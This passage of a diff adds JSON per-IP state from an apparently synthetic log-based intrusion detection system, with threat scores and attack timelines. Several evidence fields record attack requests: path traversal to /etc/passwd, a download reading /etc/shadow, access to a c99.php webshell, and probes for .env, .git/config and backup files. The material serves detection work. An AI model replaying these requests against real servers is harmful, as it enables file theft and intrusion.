+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 13,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 13,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 13,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 13,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 13,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 13,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.1": {
+      "ip": "77.77.77.1",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "sensitive_file_exposed"
+      ],
+      "attack_categories_seen": [
+        "sensitive_information_disclosure"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "sensitive_file_exposed",
+          "evidence": "Sensitive file exposed: /.env",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "sensitive_file_exposed",
+          "evidence": "Sensitive file exposed: /.env",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.2": {
+      "ip": "77.77.77.2",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "backup_file_exposed"
+      ],
+      "attack_categories_seen": [
+        "sensitive_information_disclosure"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "backup_file_exposed",
+          "evidence": "Backup/archive file exposed: /backup.zip",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "backup_file_exposed",
+          "evidence": "Backup/archive file exposed: /backup.zip",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.3": {
+      "ip": "77.77.77.3",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "source_code_exposed"
+      ],
+      "attack_categories_seen": [
+        "sensitive_information_disclosure"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "source_code_exposed",
+          "evidence": "Source code metadata/repo file exposed: /.git/config",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "source_code_exposed",
+          "evidence": "Source code metadata/repo file exposed: /.git/config",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.6,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.4": {
+      "ip": "77.77.77.4",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.5": {
+      "ip": "77.77.77.5",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "500": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 0,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.6": {
+      "ip": "77.77.77.6",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.483460"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.7": {
+      "ip": "77.77.77.7",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.8": {
+      "ip": "77.77.77.8",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.9": {
+      "ip": "77.77.77.9",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "hardcoded_secret_pattern"
+      ],
+      "attack_categories_seen": [
+        "hardcoded_credential_exposure"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "hardcoded_credential_exposure",
+          "rule_name": "hardcoded_secret_pattern",
+          "evidence": "/?apikey=AKIAIOSFODNN7EXAMPLE",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "hardcoded_credential_exposure",
+          "rule_name": "hardcoded_secret_pattern",
+          "evidence": "/?apikey=AKIAIOSFODNN7EXAMPLE",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.4,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.10": {
+      "ip": "77.77.77.10",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "curl/7.88"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "77.77.77.11": {
+      "ip": "77.77.77.11",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "python-requests/2.31"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.177459"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.631347"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.94": {
+      "ip": "203.0.113.94",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 66,
+      "requests_by_status": {
+        "200": 55
+      },
+      "unique_uris_accessed": 55,
+      "auth_failures_total": 0,
+      "auth_successes_total": 55,
+      "attack_signatures_seen": [
+        "debug_endpoint_exposed",
+        "hardcoded_creds_url",
+        "api_schema_discovery"
+      ],
+      "attack_categories_seen": [
+        "sensitive_information_disclosure",
+        "hardcoded_credential_exposure",
+        "recon_scanner"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "debug_endpoint_exposed",
+          "evidence": "Debug/admin endpoint exposed: /debug",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "hardcoded_credential_exposure",
+          "rule_name": "hardcoded_creds_url",
+          "evidence": "/login?password=admin123",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "recon_scanner",
+          "rule_name": "api_schema_discovery",
+          "evidence": "/swagger.json",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "sensitive_information_disclosure",
+          "rule_name": "debug_endpoint_exposed",
+          "evidence": "Debug/admin endpoint exposed: /debug",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "hardcoded_credential_exposure",
+          "rule_name": "hardcoded_creds_url",
+          "evidence": "/login?password=admin123",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "recon_scanner",
+          "rule_name": "api_schema_discovery",
+          "evidence": "/swagger.json",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 11,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 11,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 11,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 11,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 11,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 11,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "123.123.123.1": {
+      "ip": "123.123.123.1",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "local_file_inclusion",
+        "path_traversal"
+      ],
+      "attack_categories_seen": [
+        "local_file_inclusion",
+        "path_traversal"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "local_file_inclusion",
+          "rule_name": "local_file_inclusion",
+          "evidence": "/..//..//etc/passwd",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "path_traversal",
+          "rule_name": "path_traversal",
+          "evidence": "/static/../../account",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "local_file_inclusion",
+          "rule_name": "local_file_inclusion",
+          "evidence": "/..//..//etc/passwd",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "path_traversal",
+          "rule_name": "path_traversal",
+          "evidence": "/static/../../account",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "123.123.123.2": {
+      "ip": "123.123.123.2",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 0.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "123.123.123.3": {
+      "ip": "123.123.123.3",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "path_normalization_bypass:structural"
+      ],
+      "attack_categories_seen": [
+        "evasion"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "path_normalization_bypass:structural",
+          "evidence": "Structural path normalization bypass threshold reached (actor: -): 7 hits in window (threshold: 5)",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "evasion",
+          "rule_name": "path_normalization_bypass:structural",
+          "evidence": "Structural path normalization bypass threshold reached (actor: -): 7 hits in window (threshold: 5)",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 0.2,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "123.123.123.4": {
+      "ip": "123.123.123.4",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "webshell_access"
+      ],
+      "attack_categories_seen": [
+        "remote_code_execution"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "remote_code_execution",
+          "rule_name": "webshell_access",
+          "evidence": "/uploads/c99.php",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "remote_code_execution",
+          "rule_name": "webshell_access",
+          "evidence": "/uploads/c99.php",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 0.6,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "123.123.123.5": {
+      "ip": "123.123.123.5",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 6,
+      "requests_by_status": {
+        "200": 5
+      },
+      "unique_uris_accessed": 5,
+      "auth_failures_total": 0,
+      "auth_successes_total": 5,
+      "attack_signatures_seen": [
+        "privilege_escalation_probe",
+        "arbitrary_file_read"
+      ],
+      "attack_categories_seen": [
+        "privilege_escalation",
+        "arbitrary_file_read"
+      ],
+      "attack_timeline": [
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "privilege_escalation",
+          "rule_name": "privilege_escalation_probe",
+          "evidence": "<134>May 21 10:10:11 web01 apache2: 10.10.10.5 123.123.123.5 - - [21/May/2026:10:10:11 +0000] \"GET /",
+          "batch_number": 7
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "privilege_escalation",
+          "rule_name": "privilege_escalation_probe",
+          "evidence": "/download?file=/etc/shadow",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "arbitrary_file_read",
+          "rule_name": "arbitrary_file_read",
+          "evidence": "/download?file=/etc/shadow",
+          "batch_number": 11
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "privilege_escalation",
+          "rule_name": "privilege_escalation_probe",
+          "evidence": "/download?file=/etc/shadow",
+          "batch_number": 12
+        },
+        {
+          "timestamp": "2026-05-21T10:10:11",
+          "category": "arbitrary_file_read",
+          "rule_name": "arbitrary_file_read",
+          "evidence": "/download?file=/etc/shadow",
+          "batch_number": 12
+        }
+      ],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 1,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 1,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 1,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 1,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 1,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 1,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 1.0,
+      "escalated_to_ai": false,
+      "associated_incidents": [],
+      "batches_seen_in": 6
+    },
+    "203.0.113.95": {
+      "ip": "203.0.113.95",
+      "first_seen": "2026-05-21T10:10:11",
+      "last_seen": "2026-05-21T10:10:11",
+      "total_requests": 30,
+      "requests_by_status": {
+        "200": 25
+      },
+      "unique_uris_accessed": 20,
+      "auth_failures_total": 0,
+      "auth_successes_total": 25,
+      "attack_signatures_seen": [],
+      "attack_categories_seen": [],
+      "attack_timeline": [],
+      "user_agents_seen": [
+        "Mozilla/5.0"
+      ],
+      "request_rate_history": [
+        {
+          "batch": 7,
+          "count": 5,
+          "timestamp": "2026-05-22T09:15:32.203988"
+        },
+        {
+          "batch": 8,
+          "count": 5,
+          "timestamp": "2026-05-22T09:20:34.489514"
+        },
+        {
+          "batch": 9,
+          "count": 5,
+          "timestamp": "2026-05-22T09:22:22.179468"
+        },
+        {
+          "batch": 10,
+          "count": 5,
+          "timestamp": "2026-05-22T09:30:32.842646"
+        },
+        {
+          "batch": 11,
+          "count": 5,
+          "timestamp": "2026-05-22T09:41:50.919824"
+        },
+        {
+          "batch": 12,
+          "count": 5,
+          "timestamp": "2026-05-22T09:44:40.632345"
+        }
+      ],
+      "threat_score": 0.0,
